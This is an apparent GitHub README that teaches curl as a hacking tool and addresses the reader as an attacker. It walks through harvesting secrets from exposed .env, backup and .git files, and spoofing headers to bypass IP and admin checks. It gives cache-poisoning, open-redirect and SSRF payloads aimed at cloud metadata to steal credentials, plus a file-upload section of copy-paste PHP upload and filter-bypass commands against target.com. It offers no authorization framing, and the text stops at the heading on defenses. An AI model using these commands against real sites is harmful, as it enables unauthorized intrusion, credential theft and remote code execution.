<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=40&duration=3000&pause=1000&color=00FF00&center=true&vCenter=true&width=900&lines=CURL.;The+Hacker's+First+Recon+Tool.;The+Silent+Spy+of+Terminal.;Learn.+Extract.+Recon.+Repeat." alt="CURL Typing Animation" />
</p>

---

Every hacker starts somewhere. Most start right here, with CURL.

Client URL. That is what CURL stands for. But the name does not matter. What matters is what it does. It turns your terminal into a browser. It lets you talk to websites without opening Chrome or Firefox. It is fast. It is silent. It leaves almost no trace.

Think of CURL as your spy inside the terminal. You tell it where to go, and it brings back whatever it finds. Source code. Hidden paths. Leaked passwords. Server information. All with a single command.

## 🤔 What Is CURL?

**CURL** (Client URL) is a command-line tool used to transfer data to and from servers. It lets you communicate with websites and APIs directly from your terminal no browser needed.

Think of it as:
- 🕵️ A **spy** that silently fetches website data
- 📡 A **messenger** that sends requests to servers
- 🔍 A **reconnaissance tool** that discovers hidden information

---

## 🎯 Why CURL? (The Rebel's Answer)

| Without CURL | With CURL |
|--------------|-----------|
| Open browser → Click → Open DevTools → Network tab | Terminal → One command → All data |
| Takes ~30 seconds per request | Takes ~1 second |
| Manual, slow, visible | Automated, fast, scriptable |

> **CURL turns your terminal into a browser minus the bloat.**

---

## 📊 What Can You Do With CURL?

| # | Capability | Real-World Use |
|---|------------|----------------|
| 1 | Fetch web pages | Extract HTML source code |
| 2 | Send data (POST) | Submit forms, test logins |
| 3 | Custom headers | Spoof identity, bypass filters |
| 4 | Upload files | Test file upload vulnerabilities |
| 5 | Download files | Retrieve documents, scripts, backups |
| 6 | Follow redirects | Trace link destinations |
| 7 | API testing | Interact with REST APIs |
| 8 | Reconnaissance | Find hidden paths, emails, tech stack |
| 9 | Cookie handling | Steal, save, and reuse sessions |
| 10 | Automation | Send thousands of requests in minutes |

---

## 🗺️ Reconnaissance Types With CURL

| Type | Description | Risk Level | Example |
|------|-------------|------------|---------|
| 🟢 **Passive** | Information gathered without touching the target | Zero | DNS lookups, archive searches |
| 🔴 **Active** | Direct requests sent to the target server | IP gets logged | Header checks, hidden file discovery |

---

## 🔥 The Magic of One Command

> **Just `curl https://target.com` and you've already started hacking.**

---

### 🧠 Prerequisite: Read The Code

Before you start, understand this:

| Skill | Why It's Important |
|-------|---------------------|
| **Basic HTML** | Understand page structure where things are |
| **Basic CSS** | Identify themes, frameworks, hidden elements |
| **Basic JavaScript** | Find API calls, secrets, logic flaws |
| **Read Comments** | Even if you know nothing **READ COMMENTS!** |

> **Don't know coding? At least learn to read comments (`<!-- -->`). Developers often leave passwords, TODO notes, and sensitive info in comments!**

---

### 📦 What You Get With ONE Simple CURL Request

Running just `curl https://target.com` without any flags gives you:

| # | What You Get | Where It Lives | Example | Hacker's Use |
|---|--------------|----------------|---------|--------------|
| 1 | **Full HTML Source Code** | Entire response `<html>...</html>` | Complete page structure | Find hidden fields, forms, endpoints |
| 2 | **Hidden Comments** | Anywhere in HTML: `<head>`, `<body>`, `<footer>` | `<!-- TODO: fix password -->` | Developer notes, credentials, clues |
| 3 | **All Internal Links** | Inside `<body>` mostly, sometimes `<head>` | `/admin`, `/backup`, `/config` | Discover hidden directories |
| 4 | **JavaScript File Paths** | `<script src="...">` in `<head>` or end of `<body>` | `/js/main.js`, `/static/app.js` | Find API endpoints in JS files |
| 5 | **CSS File Paths** | `<link href="...">` inside `<head>` | `/css/style.css` | Understand page structure |
| 6 | **Image Paths** | `<img src="...">` inside `<body>` | `/images/logo.png`, `/uploads/` | Find upload directories |
| 7 | **API Endpoints** | Inside `<script>` tags or JS files | `/api/users`, `/v1/login` | Direct API access points |
| 8 | **Form Actions** | `<form action="...">` inside `<body>` | `<form action="/login">` | Know where data gets sent |
| 9 | **Hidden Input Fields** | `<input type="hidden">` inside `<form>` in `<body>` | `<input type="hidden" name="token">` | CSRF tokens, secrets |
| 10 | **Email Addresses** | Scattered in `<body>` (footer, contact sections) | `admin@target.com` | Social engineering targets |
| 11 | **Technology Stack** | File paths, comments, `<meta>` tags | `wp-content`, `php`, `react` | Identify CMS, frameworks |
| 12 | **Version Numbers** | JS/CSS file names, `<meta>` tags, comments | `jquery-3.2.1.min.js` | Find outdated vulnerable libraries |
| 13 | **Metadata** | `<meta>` tags inside `<head>` | Title, description, author | Application context |
| 14 | **CDN Links** | `<script src="cdn.example.com">` in `<head>` or `<body>` | Cloudflare, Akamai URLs | Identify infrastructure providers |
| 15 | **Tracking IDs** | `<script>` tags usually in `<head>` | `UA-123456-1` (Google Analytics) | Track owner's other websites |
| 16 | **Error Messages** | Anywhere — `<body>`, inline scripts, comments | Stack traces, debug info | Server paths, database errors |
| 17 | **Cookie Information** | `Set-Cookie` in response headers (use `-I` flag) | Session cookies | Understand authentication |
| 18 | **Redirect Logic** | `<meta http-equiv="refresh">` in `<head>`, or JS redirects in `<body>` | Meta refresh, JS redirects | Follow the flow |
| 19 | **IFrame Sources** | `<iframe src="...">` inside `<body>` | Embedded external content | Additional attack surface |
| 20 | **CORS Headers** | Response headers (use `-I` flag) | `Access-Control-Allow-Origin` | Understand API access rules |

---


### 🎯 Why Comments Are Gold (Even For Beginners)

```html
<!-- Real examples found in the wild: -->

<!-- TODO: change password from admin123 -->
<!-- Database: users_db, Table: accounts -->
<!-- Fixed in version 2.1 — remove this after testing -->
<!-- <form action="/debug/login"> -->
<!-- API key for testing: sk-test-123456 -->
<!-- Old admin panel: /old-admin — remove before launch -->
```
## File Paths Discovered. Now What?

When you run `curl https://target.com` and find paths like `/admin/`, `/backup/`, or `/images/`, you have found doors to hidden rooms. Each path is an opportunity.

### Why File Paths Matter

Imagine you find a key on the ground. The key is useless until you find the door it opens. File paths work exactly the same way. You found a path. Now you need to check what is behind that door.

If you find `/admin/` and it opens without a password, you now control the entire website. If you find `/backup/` and it contains old files, you might discover passwords that still work. Every single path can lead to something valuable.

### The Files That Matter Most

Some files are more dangerous than others when exposed. These files contain passwords, secret keys, and private information.

The `.env` file holds environment settings like database passwords and API keys. If this file is readable, you can connect directly to the database. The `config.php` file does the same thing for PHP websites. It stores the database host, username, and password in plain text.

WordPress sites have `wp-config.php`. This file contains database credentials and security keys. If you can read this file, you own the WordPress site.

The `robots.txt` file is not dangerous by itself, but it tells you which paths the website owner wants to hide from search engines. This is like someone telling you "please don't look here" and pointing directly at the hidden room.

### Backup Files Are Forgotten Treasures

Developers create backups before making changes. Then they forget to delete them. These backup files just sit there, waiting to be found.

A file named `index.php.bak` is a backup copy of the homepage code. A file named `config.php.old` is the previous version of the configuration. Files ending with `~` are created automatically by text editors when saving changes.

The most dangerous backup is `database.sql`. This is a complete copy of the database. Every username, every email address, every password hash. All in one downloadable file.

### Source Code Leaks

When the `.git` folder is accessible, the entire source code of the website can be downloaded. Every change ever made, every secret ever committed, every comment ever written. All visible to anyone who knows how to look.

### What To Do When You Find A Path

First, check if the path exists. You can do this with a simple HEAD request. A 200 status means the path is accessible. A 403 means it exists but is blocked. A 404 means it does not exist.

Second, if the path is accessible, fetch the full content. For a directory like `/admin/`, see if you can reach the login page. For a file like `.env`, download and read every line.

Third, use what you find. A password from `.env` connects you to the database. An open `/admin/` panel gives you control. A `database.sql` file exposes every user record.

### What Hurts The Most

An exposed `.env` file is critical because it gives database access. A downloadable `database.sql` file is critical because it exposes every user's data. An accessible `.git` folder is critical because it reveals the complete source code. An open `/admin/` panel is highly dangerous because it hands over website control. A browsable `/backup/` folder is dangerous because old files contain unfixed vulnerabilities.
This was just the first command. No flags. No tricks. Just `curl`.
There is a lot more to learn. Headers. Cookies. Sending data. Faking your identity. Every flag does something different.
Keep going. The good stuff is next.

## Extract Information Faster With grep

Running `curl` gives you the entire source code. But reading thousands of lines is slow. You need to extract only what matters. That is where `grep` comes in.

`grep` is a search tool. You give it a pattern, it finds every line that matches. Combine it with `curl` and you get exactly what you need in seconds.

### The Basic Formula

You pipe the output of `curl` into `grep`. The pipe symbol `|` takes the output of one command and feeds it into another.

### Find Every Comment On The Page

Comments hide developer notes, old code, and sometimes passwords.

```bash
curl -s https://target.com | grep -E '<!--'
```
| What You Want | Copy And Paste This Command |
|---------------|------------------------------|
| **Comments** | `curl -s https://target.com \| grep -E '<!--'` |
| **All links** | `curl -s https://target.com \| grep -oP 'href="[^"]*"'` |
| **JavaScript files** | `curl -s https://target.com \| grep -oP 'src="[^"]*\.js"'` |
| **CSS files** | `curl -s https://target.com \| grep -oP 'href="[^"]*\.css"'` |
| **Images** | `curl -s https://target.com \| grep -oP 'src="[^"]*\.(png\|jpg\|svg)"'` |
| **Emails** | `curl -s https://target.com \| grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'` |
| **API paths** | `curl -s https://target.com \| grep -oP '"/api/[^"]*"'` |
| **Everything at once** | `curl -s https://target.com \| grep -E '<!--\|href=\|src=\|@\|/api/'` |

Just replace `https://target.com` with your actual target and run the command.

# curl -I. The Silent Spy.

`curl -I` is a reconnaissance command. It asks the server one question. "Tell me about this page." The server responds with headers. Just headers. No body content. No HTML. No images.

Think of it like standing outside a building and reading the sign on the door. You learn who owns it, what is inside, and how secure it is. All without stepping in.

---

## The Response. What You Get.

When you run `curl -I https://target.com`, the server sends back a list of headers. Each header reveals something specific.

### Status Code

The first line tells you if the page is alive or dead.

| Code | Meaning | What You Should Do |
|------|---------|---------------------|
| 200 | Page exists and is accessible | Proceed. Download the full page. |
| 301 | Permanent redirect | Check the Location header for the new URL. |
| 302 | Temporary redirect | Same as above. Follow the trail. |
| 401 | Authentication required | The page is protected. Look for login bypass. |
| 403 | Forbidden | The page exists but you cannot access it. Try path traversal. |
| 404 | Not found | Nothing here. Move on to the next path. |
| 500 | Internal server error | The server is broken. This is interesting. Errors leak information. |

### Server Information

These headers tell you exactly what software is running.

The `Server` header reveals the web server type. Apache, Nginx, IIS, Cloudflare. Sometimes it includes the exact version number. Old versions have known vulnerabilities. Apache 2.4.49 is vulnerable to path traversal. Nginx 1.16 has HTTP request smuggling issues.

The `X-Powered-By` header reveals the programming language and version. PHP 7.4.33 means the server runs a version of PHP that stopped receiving security updates in November 2022. ASP.NET 4.5 means the server runs on Windows. Node.js means JavaScript on the backend.

### Cookies

The `Set-Cookie` header shows you how sessions are managed.

The cookie name tells you what framework the site uses. PHPSESSID means PHP. JSESSIONID means Java. ASP.NET_SessionId means ASP.NET.

The flags on the cookie tell you how secure it is. If `HttpOnly` is missing, JavaScript can read the cookie. If `Secure` is missing, the cookie travels over unencrypted connections. If `SameSite` is set to None, CSRF attacks are possible.

### Security Headers

These headers tell you how well the site is defended.

`Strict-Transport-Security` means the site forces HTTPS. If this header is missing, SSL stripping attacks might work.

`X-Frame-Options` prevents the page from being loaded in an iframe. If this header is missing, clickjacking attacks are possible.

`Content-Security-Policy` controls which scripts can run on the page. If this header is missing, XSS attacks become much easier.

`X-Content-Type-Options` prevents MIME type sniffing. If this header is missing, certain file upload attacks work.

### Caching Headers

`Cache-Control`, `ETag`, and `Expires` tell you how the server stores content. Misconfigured caching can lead to cache poisoning. You can trick the server into storing your malicious content and serving it to other users.

### CORS Headers

`Access-Control-Allow-Origin` tells you which websites can read this data. If it is set to `*` and credentials are allowed, any website can steal information from authenticated users.

### Content Information

`Content-Type` tells you what kind of response this is. HTML, JSON, XML, PDF, or an image. You know what to expect before downloading anything.

`Content-Length` tells you the size of the response in bytes. A large number means a big page. A tiny number might be an error message or a redirect.

### Redirect Information

The `Location` header appears when the server redirects you. It shows the exact destination URL. Sometimes this reveals internal hostnames or staging servers that were never meant to be public.

---

## What You Do Not Get.

The `-I` flag deliberately skips the response body. You do not receive the HTML source code. You cannot see what the page actually looks like. You cannot read any text content. You cannot find comments left by developers. You cannot see hidden form fields. You cannot extract JavaScript files or API endpoints from the page. You cannot find email addresses. You cannot download any files.

For all of that, you need a normal GET request. Just `curl https://target.com` without the `-I` flag.

---

## How To Use This Information.

Start every reconnaissance session with `curl -I`. Check the status code first. If it is 404, move on. If it is 200, dig deeper.

Look at the Server and X-Powered-By headers. Write down every version number you find. Google each one with the word "exploit" or "CVE". An outdated PHP version means dozens of unpatched vulnerabilities. An outdated Apache version means public proof of concept code is already available.

Check the security headers. Every missing header is a potential attack vector. No HSTS means try SSL stripping. No X-Frame-Options means try clickjacking. No CSP means XSS is wide open.

Read the Set-Cookie headers carefully. Missing HttpOnly means cookie theft via XSS. Missing Secure means man in the middle attacks. Missing SameSite means CSRF.

If you see a Location header, visit that URL. It might lead to an internal server or a debug page that was never meant to be public.

---

## Quick Reference Table.

| Header | What It Reveals |
|--------|-----------------|
| HTTP Status Code | Page exists? Redirected? Protected? Broken? |
| Server | Web server type and version |
| X-Powered-By | Programming language and version |
| Set-Cookie | Session management and security flags |
| Strict-Transport-Security | HTTPS enforcement |
| X-Frame-Options | Clickjacking protection |
| Content-Security-Policy | XSS and script control |
| X-Content-Type-Options | MIME sniffing protection |
| Cache-Control | Caching rules |
| Access-Control-Allow-Origin | Cross-origin access rules |
| Location | Redirect destination |
| Content-Type | Type of response (HTML, JSON, etc.) |
| Content-Length | Size of response in bytes |

---

# curl -H. Speak With Someone Else's Voice.

`curl -H` lets you add custom headers to your request. Headers are extra information you send to the server. They tell the server who you are, what you want, and how you want it.

Think of headers like labels on a package. The box stays the same. But one label says **Fragile**. Another says **Express Delivery**. Another says **Confidential**. Each label tells the handler something different. The package inside does not change. The treatment it gets does.

---

## What Is A Header

Every time you visit a website, your browser sends headers automatically. It sends your browser name. It sends your preferred language. It sends what type of data you can accept. You never see these headers. But the server reads every single one.

With `curl -H`, you take control. You decide what headers to send. You can pretend to be a different browser. You can pretend to be an admin. You can pretend to be coming from a different website. You can send information the server never expected.

---

## The Basic Syntax

```bash
curl -H "Header-Name: Header-Value" https://target.com
```

The `-H` flag stands for **Header**. After it, you write the header name, a colon, and the header value. All inside quotes.

You can use as many `-H` flags as you want. Each one adds another header to your request.

```bash
curl -H "User-Agent: MyBrowser" -H "X-Role: Admin" https://target.com
```

---

## Headers That Change Your Identity

### User-Agent

The `User-Agent` header tells the server which browser you are using. By default, curl sends `curl/8.18.0`. The server immediately knows you are not using a real browser. Some websites block curl requests entirely. You can bypass this.

```bash
curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://target.com
```

Now the server thinks you are Firefox on Windows. The blocking never triggers.

### Referer

The `Referer` header tells the server which page you came from. Some websites check this. They only allow access if you came from a specific page.

```bash
curl -H "Referer: https://target.com/admin/login" https://target.com/admin/dashboard
```

The server thinks you clicked a link on the admin login page to reach the dashboard.

### Origin

The `Origin` header tells the server which website initiated the request. APIs use this for CORS validation.

```bash
curl -H "Origin: https://target.com" https://api.target.com/data
```

---

## Headers That Change Your Role

Some applications use custom headers for internal logic. Developers create these headers for specific purposes. Sometimes they forget to remove them from production code.

### X-Forwarded-For

This header tells the server the original IP address of the client. Some servers trust this header blindly. If you send `127.0.0.1`, the server thinks you are on the same machine. Localhost often has full access.

```bash
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin
```

### X-Role and X-Admin

Some applications use custom headers for permissions. An `X-Role` header might tell the server what permissions you have. An `X-Admin` header might bypass authentication entirely.

```bash
curl -H "X-Role: admin" https://target.com/dashboard
curl -H "X-Admin: true" https://target.com/admin
```

### X-Original-URL and X-Rewrite-URL

These headers are used by reverse proxies. They tell the backend server what the original URL was. Some servers trust these headers. You can use them to access blocked paths.

```bash
curl -H "X-Original-URL: /admin" https://target.com/blocked
curl -H "X-Rewrite-URL: /admin" https://target.com/dashboard
```

---

## Headers That Change The Content

### Content-Type

The `Content-Type` header tells the server what kind of data you are sending. When you submit JSON data, you must set this header. Otherwise the server might not parse your request correctly.

```bash
curl -X POST https://api.target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test123"}'
```

Without this header, the server might treat your JSON as plain text. It might reject your request. Or it might parse it incorrectly.

### Accept

The `Accept` header tells the server what type of response you want back.

```bash
curl -H "Accept: application/json" https://target.com/api/data
```

---

## Headers That Carry Authentication

### Authorization

The `Authorization` header carries credentials. When a site uses Bearer tokens or Basic authentication, this is where they go.

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.xxx" https://api.target.com/admin
curl -H "Authorization: Basic dXNlcjpwYXNz" https://target.com/protected
```

### Cookie

The `Cookie` header sends session cookies. You can steal a cookie and use it directly without logging in.

```bash
curl -H "Cookie: session=abc123def456" https://target.com/admin
```

### X-API-Key

Some APIs use custom headers for authentication. An `X-API-Key` header might be all you need.

```bash
curl -H "X-API-Key: sk-1234567890" https://api.target.com/data
```

---

## Real Attack Scenarios

### Bypassing IP Restrictions

A website blocks everyone except internal IP addresses. You can try to fake your IP using headers.

```bash
curl -H "X-Forwarded-For: 192.168.1.1" https://target.com/internal
curl -H "X-Real-IP: 10.0.0.1" https://target.com/internal
curl -H "Client-IP: 127.0.0.1" https://target.com/internal
```

### Accessing Admin Panel

The admin panel is hidden and protected. You can try role headers to bypass the protection.

```bash
curl -H "X-Role: admin" https://target.com/admin
curl -H "X-Admin: true" https://target.com/admin
curl -H "X-Auth-Role: superuser" https://target.com/admin
```

### API Without Authentication

An API requires an API key. You found a key in the JavaScript source code. Now you use it.

```bash
curl -H "X-API-Key: sk_test_123456" https://api.target.com/users
```

### Cache Poisoning

You can inject headers that get cached and served to other users.

```bash
curl -H "X-Forwarded-Host: evil.com" https://target.com
```

If the server reflects this header in cached responses, every user will get links pointing to `evil.com`.

---

## Quick Reference

| Header | Purpose |
|--------|---------|
| `User-Agent` | Fake your browser identity |
| `Referer` | Fake where you came from |
| `Origin` | Fake which site initiated the request |
| `X-Forwarded-For` | Fake your IP address |
| `X-Role` | Fake your role or permissions |
| `Content-Type` | Tell the server what format your data is |
| `Accept` | Tell the server what format you want back |
| `Authorization` | Send credentials and tokens |
| `Cookie` | Send session cookies |
| `X-API-Key` | Send API authentication keys |
| `Cache-Control` | Control caching behavior |
| `X-Original-URL` | Bypass URL restrictions |
| `X-Forwarded-Host` | Poison caches |

---

## How To Practice

The best way to learn headers is to see what you are sending. Use a service that echoes your request back to you.

```bash
curl -H "X-Custom: HelloWorld" https://postman-echo.com/get
curl -H "User-Agent: TheRebel" https://httpbin.org/headers
```

These services show you exactly what headers the server received. You can see the immediate effect of your `-H` flag.

# curl -v. See Everything. Hide Nothing.

`curl -v` turns on verbose mode. It shows you the entire conversation between your terminal and the server. Every line. Every header. Every handshake. Nothing stays hidden.

Without `-v`, you see only the final response. It is like ordering food and only seeing the plate that arrives. With `-v`, you see the kitchen. You see the chef taking your order. You see the ingredients being picked. You see exactly how the meal was made.

---

## What -v Actually Does

When you add `-v` to any curl command, three new types of output appear.

Lines starting with `*` are connection details. These are curl talking to itself, telling you what is happening behind the scenes. DNS resolution. TCP connection. TLS handshake. Certificate verification. Every step of the journey from your terminal to the server.

Lines starting with `>` are your request headers. These are the exact headers curl is sending on your behalf. Every `-H` flag you added appears here. Every default header curl sends automatically appears here. You see exactly what the server sees.

Lines starting with `<` are the response headers from the server. Status code. Server type. Cookies being set. Cache rules. Security policies. Everything the server wants you to know before you even see the body.

---

## The Basic Command

```bash
curl -v https://example.com
```

The output will look something like this.

```
*   Trying 93.184.215.14:443...
*   Connected to example.com (93.184.215.14) port 443
*   ALPN: curl offers h2,http/1.1
*   TLSv1.3, TLS handshake, Client hello (1):
*   TLSv1.3, TLS handshake, Server hello (2):
*   TLS certificate verified ok
>   GET / HTTP/1.1
>   Host: example.com
>   User-Agent: curl/8.18.0
>   Accept: */*
>
<   HTTP/1.1 200 OK
<   Content-Type: text/html; charset=UTF-8
<   Server: ECS (dce/26CE)
<   Content-Length: 1256
<
...response body here...
```

Every single step of the request is visible. Nothing is hidden from you.

---

## Understanding The Three Symbols

The `*` symbol marks connection information. This is the transport layer. TCP sockets. TLS certificates. IP addresses. If something goes wrong at this level, the server never even sees your request. You need this output to debug connectivity issues.

The `>` symbol marks your outgoing request. These are the headers you are sending. The method. The path. The host. Your user agent. Any cookies. Any custom headers you added with `-H`. This is what the server reads when it receives your request.

The `<` symbol marks the incoming response. These are the headers the server sends back. The status code. The content type. Any cookies being set. Security headers like HSTS and CSP. This is the server's first reply before the actual content.

---

## Why You Need -v

### When An Attack Fails

You try a header injection. You send `X-Forwarded-For: 127.0.0.1`. The response looks the same as before. Without `-v`, you assume the server ignored your header.

With `-v`, you see the truth. Maybe Cloudflare stripped your header before it reached the origin server. Maybe the server received it but the application code ignored it. Maybe you typed the header name wrong and it was never sent. `-v` shows you exactly what was transmitted.

### When A Redirect Is Confusing

You request `/admin` and get a login page. Without `-v`, you just see the login form HTML. You do not know if you were redirected or if the page simply serves a login form to unauthenticated users.

With `-v`, you see the `302 Found` status code and the `Location: /login` header. Now you know for certain. The admin page exists. It redirects to login. This is valuable reconnaissance information.

### When SSL Fails

You try to connect to a site and curl shows an SSL error. Without `-v`, the error message is generic. "SSL certificate problem."

With `-v`, you see the entire certificate chain. You see which certificate expired. You see whether the hostname matches. You see the exact TLS version negotiated. This information helps you understand whether the server is misconfigured or whether you are being man-in-the-middled.

### When You Are Learning

You want to understand what headers a browser sends versus what curl sends. You run `curl -v https://httpbin.org/get` and study the `>` lines. You see `User-Agent: curl/8.18.0`. You see `Accept: */*`.

Now you know what to change when you want to look like a real browser. You add `-H "User-Agent: Mozilla/5.0"` and `-H "Accept: text/html"`. You run `-v` again and verify the headers changed. This is how you learn. By seeing. By comparing.

---

## Practical Commands To Try

See what a normal request looks like. Study the default headers curl sends.

```bash
curl -v https://postman-echo.com/get
```

See what happens when you add custom headers. Confirm they were actually sent.

```bash
curl -v -H "X-Custom-Header: HelloWorld" https://postman-echo.com/get
```

See the full POST request including all headers and the body.

```bash
curl -v -X POST https://postman-echo.com/post -d "username=admin&password=test123"
```

See every step of a redirect chain.

```bash
curl -v -L https://github.com
```

See SSL certificate details for any site. Check expiry dates and issuers.

```bash
curl -v https://expired.badssl.com/ 2>&1 | grep -E "expire|subject|issuer|start"
```

---

## -v vs Other Output Flags

| Flag | Request Headers | Response Headers | Response Body | Connection Info |
|------|-----------------|-------------------|---------------|-----------------|
| No flag | Hidden | Hidden | Visible | Hidden |
| `-I` | Hidden | Visible | Hidden | Hidden |
| `-v` | **Visible** | **Visible** | Visible | **Visible** |
| `-i` | Hidden | Visible | Visible | Hidden |

`-v` is the only flag that shows everything. Request headers. Response headers. Connection details. Response body. Nothing is omitted.

---

## When To Use -v

Use `-v` when you are developing an attack and it does not work. Use `-v` when you want to see what headers a server expects. Use `-v` when you are troubleshooting SSL errors. Use `-v` when you are learning and want to understand what happens under the hood.

Do not use `-v` when you are running a script that processes the response body. The extra output will interfere with parsing. Do not use `-v` when you only care about the final result. It adds noise you do not need.

---

## What -v Cannot Do

`-v` does not find vulnerabilities on its own. It is a diagnostic tool, not an attack tool. It shows you what happened, not what could happen. It helps you understand failures, but it does not cause them.

The vulnerability is not in the output of `-v`. The vulnerability is in what you learn from studying that output. A missing security header. An outdated server version. A cookie without the Secure flag. `-v` reveals these. You must recognize them.

# curl -L. Follow The Trail.

`curl -L` follows redirects. When a server says "go here instead", `-L` actually goes there. Without `-L`, curl just tells you where you would be sent. With `-L`, curl makes the journey and brings back whatever is at the destination.

---

## What Is A Redirect

A redirect is like a sign on a shop door. The sign says "We moved. New address: Third house, next street." You read the sign. You go to the new address. That is a redirect.

Servers send a 301 or 302 status code. Along with a `Location` header that contains the new URL. Browsers follow this automatically. Curl does not follow unless you use `-L`.

---

## Basic Commands

```bash
# Follow a redirect to the final page
curl -L https://github.com

# Follow at most 3 redirects, then stop
curl -L --max-redirs 3 https://target.com

# Follow and see every step
curl -v -L https://bit.ly/shortlink

# Without -L — only see the redirect, do not follow
curl -I https://short.link
```

---

## How To Find Vulnerabilities With -L

### Open Redirect

If the server redirects you to any external URL you give it, that is an Open Redirect. Attackers use this for phishing. The link looks like the real site. But it sends victims somewhere else.

```bash
curl -I "https://target.com/login?redirect=https://evil.com"
```

If the response contains `Location: https://evil.com`, the vulnerability is confirmed. The server will send anyone who clicks this link to `evil.com`.

### SSRF via Redirect

If the server follows redirects to internal addresses, you can access services that are not exposed to the internet. Cloud metadata. Internal APIs. Database endpoints.

```bash
curl -L "https://target.com/fetch?url=http://169.254.169.254/"
```

If you get a response from the AWS metadata server, you can steal cloud credentials.

### Redirect Bypass Techniques

Some sites validate the redirect URL but not perfectly. You can try these bypasses.

```bash
# Double slash bypass
curl -I "https://target.com/go?url=//evil.com"

# Protocol relative bypass
curl -I "https://target.com/go?url=https:evil.com"

# URL encoded bypass
curl -I "https://target.com/go?url=https%3A%2F%2Fevil.com"
```

---

## Status Codes And What They Mean

| Status | Name | What Happens |
|--------|------|--------------|
| 301 | Permanent Redirect | The page moved forever. Use the new URL from now on. |
| 302 | Temporary Redirect | The page moved for now. Check the original URL next time. |
| 303 | See Other | Always use GET for the next request. |
| 307 | Temporary Redirect | Same as 302 but keep the same HTTP method. |
| 308 | Permanent Redirect | Same as 301 but keep the same HTTP method. |

`-L` follows all of these automatically.

---

## -L vs Without -L

| Without -L | With -L |
|------------|---------|
| You see the 301 or 302 status | You get the final page content |
| You see the Location header | You get the actual HTML |
| You learn where the short link goes | You get what is at the destination |
| You see the first step only | You reach the end of the journey |

---

## When To Use -L

Use `-L` when you want to expand a short link and see the real URL.

Use `-L` when you want to trace a redirect chain and see every step.

Use `-L` when you are testing for Open Redirect vulnerabilities.

Use `-L` when you are testing for SSRF through redirect chains.

Use `-L` when you are mapping authentication flows. Login pages often redirect multiple times. Each redirect sets cookies or adds parameters.

---

## Pro Tips

Combine `-L` with `-v` to see every redirect step.

```bash
curl -v -L https://target.com
```

Combine `-L` with `-I` to see only the headers at each step.

```bash
curl -I -L https://target.com
```

Set a maximum redirect limit to avoid infinite loops.

```bash
curl -L --max-redirs 5 https://target.com
```

# File Upload Vulnerability. How To Find And Exploit With CURL.

File upload is the most dangerous feature on any website. A single upload form that accepts the wrong file can give an attacker complete control of the server. This guide covers everything. How upload works. How to test it. How to bypass filters. And how to exploit what you find.

---

## How File Upload Works

Every upload form has three parts. The HTML form that lets you pick a file. The browser that sends the file to the server. And the server code that receives the file and saves it somewhere.

The server decides what to accept. Some servers check the file extension. Some check the MIME type. Some check the actual file content. Some check nothing at all. Your job is to find out what the server checks and what it does not.

---

## Where To Find Upload Forms

Upload forms are everywhere. Profile picture uploads. Document submission pages. Contact forms with attachment options. Admin panels with file managers. E-commerce product image uploads. Forum avatar uploads. Anywhere a user can send a file.

Google dorks help you find them faster.

```
inurl:upload.php
inurl:file_upload
intext:"choose file"
intitle:"upload"
```

---

## The First Test. Always Start Here.

Create a simple PHP file. Upload it without any tricks. See what the server says.

```bash
echo '<?php echo "UPLOAD_OK"; ?>' > test.php
curl -F "file=@test.php" https://target.com/upload.php
```

If the upload succeeds and the server returns a path to your file, access it directly. If you see `UPLOAD_OK` on the page, the PHP code executed. You have remote code execution. The test is over.

```bash
curl https://target.com/uploads/test.php
```

---

## Bypass Techniques. When The Server Says No.

Most servers block `.php` files. But they do not block everything. Here is what you try when the first test fails.

### Double Extension

Some servers only check the last extension. Give them a safe extension to look at while keeping the dangerous one hidden.

```bash
curl -F "file=@test.php;filename=shell.php.jpg" https://target.com/upload.php
curl -F "file=@test.php;filename=shell.jpg.php" https://target.com/upload.php
```

### Case Bypass

Windows servers do not care about uppercase and lowercase. PHP, PhP, pHp — they all execute the same way. But the filter might only check lowercase.

```bash
curl -F "file=@test.php;filename=shell.PhP" https://target.com/upload.php
curl -F "file=@test.php;filename=shell.PHP" https://target.com/upload.php
curl -F "file=@test.php;filename=shell.pHp" https://target.com/upload.php
```

### Alternate PHP Extensions

PHP files do not have to end in `.php`. Many servers are configured to execute other extensions as PHP. Try them all.

```bash
curl -F "file=@test.php;filename=shell.phtml" https://target.com/upload.php
curl -F "file=@test.php;filename=shell.php5" https://target.com/upload.php
curl -F "file=@test.php;filename=shell.php7" https://target.com/upload.php
curl -F "file=@test.php;filename=shell.phar" https://target.com/upload.php
curl -F "file=@test.php;filename=shell.shtml" https://target.com/upload.php
```

### MIME Type Spoofing

The browser tells the server what type of file is being uploaded. You can lie about this. The server might believe you.

```bash
curl -F "file=@test.php;type=image/jpeg" https://target.com/upload.php
curl -F "file=@test.php;type=image/png" https://target.com/upload.php
curl -F "file=@test.php;type=image/gif" https://target.com/upload.php
curl -F "file=@test.php;type=application/pdf" https://target.com/upload.php
```

### Filename Manipulation

You can change the filename that the server sees without changing the actual file. The `filename` parameter in the `-F` flag controls what the server thinks the file is called.

```bash
curl -F "file=@test.php;filename=innocent.jpg" https://target.com/upload.php
```

### Null Byte Injection

On older PHP versions, a null byte tricks the server into thinking the filename ends early. Everything after the null byte is ignored.

```bash
curl -F "file=@test.php;filename=shell.php%00.jpg" https://target.com/upload.php
```

### Special Characters

Spaces, dots, and path traversal characters can confuse poorly written upload handlers.

```bash
curl -F "file=@test.php;filename=shell.php." https://target.com/upload.php
curl -F "file=@test.php;filename=shell.php%20" https://target.com/upload.php
curl -F "file=@test.php;filename=../shell.php" https://target.com/upload.php
```

---

## How To Know If The Upload Worked

The server response tells you everything. Look for these signs.

A direct URL to your file in the response body means the file is accessible. A success message like `"uploaded":true` confirms the server accepted it. The original filename appearing in the response means the server kept your name. An error message tells you exactly what filter blocked you — use that information for your next attempt.

If the response gives you nothing, try accessing common upload directories.

```bash
curl https://target.com/uploads/test.php
curl https://target.com/upload/test.php
curl https://target.com/files/test.php
curl https://target.com/images/test.php
curl https://target.com/assets/test.php
curl https://target.com/media/test.php
curl https://target.com/tmp/test.php
```

---

## What Stops This Vulnerability

